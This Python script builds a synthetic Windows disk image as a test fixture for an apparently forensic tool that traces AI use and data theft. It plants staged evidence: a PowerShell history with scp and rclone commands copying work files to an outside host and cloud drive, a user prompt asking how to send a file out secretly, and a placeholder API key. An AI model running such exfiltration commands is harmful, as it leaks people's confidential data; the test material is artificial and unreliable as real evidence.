"""Build the Windows NTFS E01 fixture (plan Appendix C.1).

Stages the scenario tree, formats and populates an NTFS image inside a privileged
debian container (ntfs-3g), deletes ``secret_plan.txt`` so a deleted MFT record
remains, then acquires the raw image to ``tests/fixtures/images/windows.E01``.

Exit codes: 0 success; 2 missing host tool (docker / ewfacquire / daemon / samples); 1 build failure.
"""

from __future__ import annotations

import json
import os
import shlex
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
import zlib
from datetime import UTC, datetime
from hashlib import sha256
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SAMPLES = ROOT / "tests" / "fixtures" / "files" / "third_party" / "dissect"
IMAGES = ROOT / "tests" / "fixtures" / "images"
EXPECTED = ROOT / "tests" / "fixtures" / "expected"

DELETED_REL = "Users/kim/Documents/secret_plan.txt"
DEFAULT_TIME = datetime(2026, 9, 30, 0, 0, 0, tzinfo=UTC)
SESSION_ID = "1111aaaa-0000-0000-0000-000000000001"
PNG_NAME = "DALL·E 2026-10-01 00.35.00 - a red logo.png"
COPY_REL = "Users/kim/Pictures/logo-copy.png"
CACHE_REL = (
    "Users/kim/AppData/Local/Google/Chrome/User Data/Default/Cache/Cache_Data/0123456789abcdef_0"
)
CACHE_URL = "https://files.oaiusercontent.com/file-cached"
ZONE_STREAMS: dict[str, str] = {
    f"Users/kim/Downloads/{PNG_NAME}": (
        "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://chatgpt.com/c/abc\r\n"
        "HostUrl=https://files.oaiusercontent.com/file-xyz\r\n"
    ),
    COPY_REL: (
        "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://chatgpt.com/\r\n"
        "HostUrl=https://files.oaiusercontent.com/file-copy\r\n"
    ),
}

PROPOSAL = "# 제안서 요약\n\n본 문서는 경쟁사 제안서의 핵심 조건을 정리한 것이다. 가격 조건, 납기, 보증 범위를 비교하였다.\n"
MINUTES = "# 회의록\n\n1. 일정 확정\n2. 예산 검토\n3. 담당자 배정\n"
MINUTES_EDITED = MINUTES + "\n사람이 추가한 결론: 예산 10% 삭감.\n"

SAMPLE_COPIES: tuple[tuple[str, str], ...] = (
    (
        "Users/kim/AppData/Roaming/AnyDesk/file_transfer_trace.txt",
        "plugins/apps/remoteaccess/anydesk/file_transfer_trace.txt",
    ),
    ("Windows/Prefetch/MPCMDRUN.EXE-962E6200.pf", "plugins/os/windows/prefetch/MPCMDRUN.EXE-962E6200.pf"),
    ("Windows/AppCompat/Programs/Amcache.hve", "plugins/os/windows/amcache/amcache-new.hve"),
    ("Windows/System32/winevt/Logs/Security.evtx", "plugins/os/windows/log/evtx/Security.evtx"),
    ("Windows/System32/sru/SRUDB.dat", "plugins/os/windows/sru/SRUDB.dat"),
)

EXPECTED_JSON: dict[str, object] = {
    "users": ["kim"],
    "tools": ["Claude Code", "ChatGPT", "Claude", "Ollama"],
    "prompts_contain": ["경쟁사 제안서를 요약해서", "외부 서버로 몰래 보내는"],
    "deleted_files": ["secret_plan.txt", "old_report.docx"],
    "exfil": ["203.0.113.10", "rclone", "AnyDesk"],
    "attributions": {
        "/Users/kim/work/proposal.md": "ai_generated",
        "/Users/kim/work/edited.md": "ai_assisted",
        "/Users/kim/Downloads/DALL·E 2026-10-01 00.35.00 - a red logo.png": "ai_generated",
    },
    "credentials_providers": ["OpenAI"],
    "download_origins": ["files.oaiusercontent.com/file-xyz", "logo-copy.png"],
    "cache_images": ["files.oaiusercontent.com/file-cached"],
}

MTIMES: dict[str, datetime] = {
    "Users/kim/work/proposal.md": datetime(2026, 10, 1, 1, 0, 21, tzinfo=UTC),
    "Users/kim/work/edited.md": datetime(2026, 10, 1, 3, 0, 0, tzinfo=UTC),
    "Users/kim/work/notes.txt": datetime(2026, 9, 30, 9, 0, 0, tzinfo=UTC),
}


class HostToolMissing(RuntimeError):
    pass


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _webkit_us(dt: datetime) -> int:
    return int((dt - datetime(1601, 1, 1, tzinfo=UTC)).total_seconds()) * 1_000_000


def _filetime(dt: datetime) -> int:
    return int((dt - datetime(1601, 1, 1, tzinfo=UTC)).total_seconds()) * 10_000_000


def _write_text(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(text.encode("utf-8"))


def _claude_session() -> str:
    t = datetime(2026, 10, 1, 1, 0, 0, tzinfo=UTC)
    lines: list[dict[str, object]] = [
        {
            "type": "user",
            "sessionId": SESSION_ID,
            "timestamp": _iso(t),
            "cwd": "C:\\Users\\kim\\work",
            "message": {"role": "user", "content": "경쟁사 제안서를 요약해서 proposal.md로 작성해줘"},
        },
        {
            "type": "assistant",
            "sessionId": SESSION_ID,
            "timestamp": _iso(datetime(2026, 10, 1, 1, 0, 20, tzinfo=UTC)),
            "message": {
                "role": "assistant",
                "model": "claude-sonnet-4-5",
                "content": [
                    {"type": "text", "text": "작성하겠습니다"},
                    {
                        "type": "tool_use",
                        "id": "toolu_01",
                        "name": "Write",
                        "input": {"file_path": "C:\\Users\\kim\\work\\proposal.md", "content": PROPOSAL},
                    },
                ],
            },
        },
        {
            "type": "assistant",
            "sessionId": SESSION_ID,
            "timestamp": _iso(datetime(2026, 10, 1, 1, 2, 0, tzinfo=UTC)),
            "message": {
                "role": "assistant",
                "model": "claude-sonnet-4-5",
                "content": [
                    {
                        "type": "tool_use",
                        "id": "toolu_02",
                        "name": "Write",
                        "input": {"file_path": "C:\\Users\\kim\\work\\edited.md", "content": MINUTES},
                    }
                ],
            },
        },
        {
            "type": "user",
            "sessionId": SESSION_ID,
            "timestamp": _iso(datetime(2026, 10, 1, 1, 5, 0, tzinfo=UTC)),
            "message": {"role": "user", "content": "이 파일을 외부 서버로 몰래 보내는 방법 알려줘"},
        },
    ]
    return "".join(json.dumps(line, ensure_ascii=False) + "\n" for line in lines)


def _chrome_history(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.unlink(missing_ok=True)
    conn = sqlite3.connect(path)
    try:
        conn.executescript(
            """
            CREATE TABLE urls(id INTEGER PRIMARY KEY AUTOINCREMENT, url LONGVARCHAR, title LONGVARCHAR,
                visit_count INTEGER DEFAULT 0 NOT NULL, typed_count INTEGER DEFAULT 0 NOT NULL,
                last_visit_time INTEGER NOT NULL, hidden INTEGER DEFAULT 0 NOT NULL);
            CREATE TABLE visits(id INTEGER PRIMARY KEY AUTOINCREMENT, url INTEGER NOT NULL,
                visit_time INTEGER NOT NULL, from_visit INTEGER, transition INTEGER DEFAULT 0 NOT NULL,
                segment_id INTEGER, visit_duration INTEGER DEFAULT 0 NOT NULL);
            CREATE TABLE downloads(id INTEGER PRIMARY KEY, guid VARCHAR NOT NULL,
                current_path LONGVARCHAR NOT NULL, target_path LONGVARCHAR NOT NULL,
                start_time INTEGER NOT NULL, received_bytes INTEGER NOT NULL, total_bytes INTEGER NOT NULL,
                state INTEGER NOT NULL, danger_type INTEGER NOT NULL, interrupt_reason INTEGER NOT NULL,
                hash BLOB NOT NULL, end_time INTEGER NOT NULL, opened INTEGER NOT NULL,
                last_access_time INTEGER NOT NULL, transient INTEGER NOT NULL, referrer VARCHAR NOT NULL,
                site_url VARCHAR NOT NULL, tab_url VARCHAR NOT NULL, tab_referrer_url VARCHAR NOT NULL,
                mime_type VARCHAR(255) NOT NULL, original_mime_type VARCHAR(255) NOT NULL);
            CREATE TABLE downloads_url_chains(id INTEGER NOT NULL, chain_index INTEGER NOT NULL,
                url LONGVARCHAR NOT NULL, PRIMARY KEY(id, chain_index));
            """
        )
        visits = [
            ("https://chatgpt.com/c/abc", "Phishing email draft", datetime(2026, 10, 1, 0, 30, tzinfo=UTC)),
            ("https://claude.ai/new", "Claude", datetime(2026, 10, 1, 0, 40, tzinfo=UTC)),
        ]
        for url, title, when in visits:
            cur = conn.execute(
                "INSERT INTO urls(url,title,visit_count,last_visit_time) VALUES(?,?,1,?)",
                (url, title, _webkit_us(when)),
            )
            conn.execute("INSERT INTO visits(url,visit_time) VALUES(?,?)", (cur.lastrowid, _webkit_us(when)))
        start = _webkit_us(datetime(2026, 10, 1, 0, 35, 10, tzinfo=UTC))
        target = f"C:\\Users\\kim\\Downloads\\{PNG_NAME}"
        file_url = "https://files.oaiusercontent.com/file-xyz"
        conn.execute(
            "INSERT INTO downloads VALUES(1,'guid-0001',?,?,?,?,?,1,0,0,x'',?,0,?,0,?,?,?,?,'image/png','image/png')",
            (target, target, start, 200, 200, start, start, "https://chatgpt.com/", file_url,
             "https://chatgpt.com/c/abc", "https://chatgpt.com/c/abc"),
        )
        conn.execute("INSERT INTO downloads_url_chains VALUES(1,0,?)", (file_url,))
        conn.commit()
    finally:
        conn.close()


def _simple_cache_entry(url: str, body: bytes) -> bytes:
    header_magic, eof_magic = 0xFCFB6D1BA7725C30, 0xF4FA6F45970D41D8
    key = url.encode()
    headers = b"HTTP/1.1 200 OK\x00content-type: image/png\x00\x00"
    return (
        struct.pack("<QIIII", header_magic, 5, len(key), 0, 0)
        + key
        + body
        + struct.pack("<QIIII", eof_magic, 0, zlib.crc32(body) & 0xFFFFFFFF, len(body), 0)
        + headers
        + struct.pack("<QIIII", eof_magic, 0, 0, len(headers), 0)
    )


def _png(c2pa_marker: bool = True, rgb: bytes = b"\xd0\x20\x20") -> bytes:
    def chunk(tag: bytes, data: bytes) -> bytes:
        body = tag + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)

    ihdr = struct.pack(">IIBBBBB", 8, 8, 8, 2, 0, 0, 0)
    raw = b"".join(b"\x00" + rgb * 8 for _ in range(8))
    c2pa = b"c2pa" + b'{"claim_generator":"ChatGPT","digitalSourceType":"trainedAlgorithmicMedia"}'
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + (chunk(b"caBX", c2pa) if c2pa_marker else b"")
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


def _recycle_i(original: str, deleted: datetime, size: int) -> bytes:
    path = (original + "\x00").encode("utf-16-le")
    return struct.pack("<qqqi", 2, size, _filetime(deleted), len(path) // 2) + path


def _set_times(stage: Path) -> None:
    for p in sorted(stage.rglob("*"), key=lambda q: len(q.parts), reverse=True):
        rel = p.relative_to(stage).as_posix()
        ts = MTIMES.get(rel, DEFAULT_TIME).timestamp()
        os.utime(p, (ts, ts))
    root_ts = DEFAULT_TIME.timestamp()
    os.utime(stage, (root_ts, root_ts))


def build_stage(stage: Path) -> None:
    kim = stage / "Users" / "kim"
    _write_text(kim / ".claude" / "projects" / "C--Users-kim-work" / f"{SESSION_ID}.jsonl", _claude_session())
    _write_text(kim / "work" / "proposal.md", PROPOSAL)
    _write_text(kim / "work" / "edited.md", MINUTES_EDITED)
    _write_text(kim / "work" / "notes.txt", "개인 메모")
    _chrome_history(kim / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History")
    (kim / "Downloads").mkdir(parents=True, exist_ok=True)
    (kim / "Downloads" / PNG_NAME).write_bytes(_png())
    (kim / "Pictures").mkdir(parents=True, exist_ok=True)
    (kim / "Pictures" / "logo-copy.png").write_bytes(_png(c2pa_marker=False, rgb=b"\x20\x40\xd0"))
    cache = stage / CACHE_REL
    cache.parent.mkdir(parents=True, exist_ok=True)
    cache.write_bytes(_simple_cache_entry(CACHE_URL, _png(c2pa_marker=False, rgb=b"\x20\xd0\x40")))
    _write_text(
        kim / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine"
        / "ConsoleHost_history.txt",
        "claude\r\nscp C:\\Users\\kim\\work\\proposal.md kim@203.0.113.10:/tmp/\r\n"
        "rclone copy C:\\Users\\kim\\work gdrive:backup\r\n",
    )
    _write_text(kim / "Documents" / "secret_plan.txt", "삭제될 문서")
    sid = stage / "$Recycle.Bin" / "S-1-5-21-1000-1000-1000-1001"
    sid.mkdir(parents=True, exist_ok=True)
    (sid / "$IABC123.txt").write_bytes(
        _recycle_i("C:\\Users\\kim\\Documents\\old_report.docx", datetime(2026, 10, 1, 2, 0, 0, tzinfo=UTC), 12345)
    )
    (sid / "$RABC123.txt").write_bytes(b"old report bytes\n")
    _write_text(kim / "project" / ".env", "OPENAI_API_KEY=sk-proj-" + "A" * 36 + "\n")
    _write_text(kim / ".ollama" / "history", "요약해줘\n")
    for dest, sample in SAMPLE_COPIES:
        src = SAMPLES / sample
        if not src.is_file():
            raise HostToolMissing(f"third-party sample missing: {src} (run tools/fetch_samples.py)")
        target = stage / dest
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(src, target)
    (stage / "Windows" / "System32").mkdir(parents=True, exist_ok=True)
    _set_times(stage)


def planted_files() -> list[str]:
    with tempfile.TemporaryDirectory(prefix="aitrace-win-plan-") as tmp:
        stage = Path(tmp)
        build_stage(stage)
        return sorted(
            "/" + p.relative_to(stage).as_posix()
            for p in stage.rglob("*")
            if p.is_file() and p.relative_to(stage).as_posix() != DELETED_REL
        )


def _require_tools() -> None:
    for tool in ("docker", "ewfacquire"):
        if shutil.which(tool) is None:
            raise HostToolMissing(f"required host tool not found on PATH: {tool}")
    probe = subprocess.run(["docker", "info"], capture_output=True, text=True, check=False)
    if probe.returncode != 0:
        raise HostToolMissing(f"docker daemon not reachable: {probe.stderr.strip()}")


def _run(cmd: list[str]) -> None:
    subprocess.run(cmd, check=True)


def build() -> Path:
    _require_tools()
    IMAGES.mkdir(parents=True, exist_ok=True)
    EXPECTED.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="aitrace-win-") as tmp:
        parent = Path(tmp)
        build_stage(parent / "stage")
        (parent / "ads").mkdir()
        ads_cmds = ""
        for i, (rel, text) in enumerate(ZONE_STREAMS.items()):
            (parent / "ads" / str(i)).write_bytes(text.encode())
            ads_cmds += f"cp /w/ads/{i} {shlex.quote('/mnt/n/' + rel + ':Zone.Identifier')} && "
        script = (
            "apt-get -qq update && apt-get -qq install -y ntfs-3g >/dev/null && "
            "truncate -s 48M /w/windows.raw && mkntfs -q -F -f -L WINFIX /w/windows.raw && "
            "mkdir /mnt/n && ntfs-3g -o streams_interface=windows /w/windows.raw /mnt/n && cp -a /w/stage/. /mnt/n/ && "
            f"{ads_cmds}rm /mnt/n/{DELETED_REL} && umount /mnt/n"
        )
        _run(["docker", "run", "--rm", "--privileged", "-v", f"{parent}:/w", "debian:bookworm-slim",
              "bash", "-c", script])
        for old in IMAGES.glob("windows.E*"):
            old.unlink()
        _run([
            "ewfacquire", "-u", "-t", str(IMAGES / "windows"), "-f", "encase6", "-c", "deflate:fast",
            "-C", "AITRACE-WIN", "-D", "aitrace windows fixture", "-E", "WIN-001", "-e", "aitrace",
            "-N", "fixture", "-d", "sha256", "-q", str(parent / "windows.raw"),
        ])
    (EXPECTED / "windows.json").write_text(
        json.dumps(EXPECTED_JSON, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    e01 = IMAGES / "windows.E01"
    print(f"built {e01} sha256={sha256(e01.read_bytes()).hexdigest()}")
    return e01


def main() -> int:
    try:
        build()
    except HostToolMissing as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    except subprocess.CalledProcessError as exc:
        print(f"error: build step failed: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
